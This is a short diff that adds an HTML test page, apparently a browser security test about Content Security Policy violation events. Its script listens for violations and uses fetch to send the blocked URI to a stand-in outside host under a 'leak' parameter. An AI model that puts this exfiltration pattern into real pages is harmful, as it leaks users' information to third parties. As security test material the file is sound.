@@ -1,0 +1,9 @@
+<img src="https://bugs.chromium.org/attachment?url=example.png" onerror="reportViolation(event)">
+<script>
+  function reportViolation(event) {
+    // Trigger the securitypolicyviolation event
+    document.addEventListener('securitypolicyviolation', function(e) {
+      fetch('https://a.test/report/?leak=c932892&blockedURI=' + e.blockedURI);
+    });
+  }
+</script>
